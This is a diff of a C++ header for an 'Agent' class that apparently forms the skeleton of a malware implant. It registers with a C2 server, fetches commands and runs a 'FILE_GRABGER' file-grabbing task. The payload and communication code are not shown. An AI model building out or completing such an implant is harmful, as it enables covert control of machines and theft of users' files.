@@ -1,57 +1,72 @@
-#include "BaseModule.h"
+#pragma once
+
 #include "Task.h"
 #include <vector>
 #include <thread>
-#include "Communicator/communicator.h"
+#include <unistd.h>
 
 using namespace std;
+using json = nlohmann::json;
+
+#define DEBUG
 
 class Agent
 {
 private:
-    std::vector<Task> tasks;
 
-    void run()
+    bool agent_run;
+
+    std::vector<std::unique_ptr<Task>> tasks;
+    json config;
+
+    void run_all_tasks()
     {
-        /**/
-    }
+        std::cout << "Running " << tasks.size() << " tasks !" << std::endl;
 
-public:
-    Agent() : agent_id(generate_agent_id()) {
-        /**/
-    }
-
-    ~Agent();
-
-    void start()
-    {
-        json config_from_c2 = communicator::getInstance().c2_registration();
-        start_from_config(config_from_c2);
+        for (const std::unique_ptr<Task> & t: tasks)
+        {
+            t->run();
+        }
+        
     }
 
     void start_from_config(const json & config)
     {
-        /*  iterate config
-            construct each module derived class 
-            build a task
-            run all tasks
+        /*  
+        iterate config
+        construct each module derived class 
+        build a task
+        run all tasks
         */
+
+        Task * t = Task::BuildTask("FILE_GRABGER", config["FILE_GRABGER"]);
+
+        tasks.push_back(std::unique_ptr<Task>(t));
+        
+        run_all_tasks();
     }
 
-    void stop()
+    bool agent_register()
     {
-        for (Task t : tasks)
-        {
-            t.stop();
-        }
+        return Communicator::getInstance().c2_registration();
+    }
+
+    bool get_server_config()
+    {
+        return Communicator::getInstance().check_new_command(&config);
+    }
+
+public:
+    Agent() : agent_run(true) {
+
+    }
+
+    ~Agent()
+    {
         
     }
+
+    void start();
+
+    void stop();
 };
-
-Agent::Agent(/* args */)
-{
-}
-
-Agent::~Agent()
-{
-}
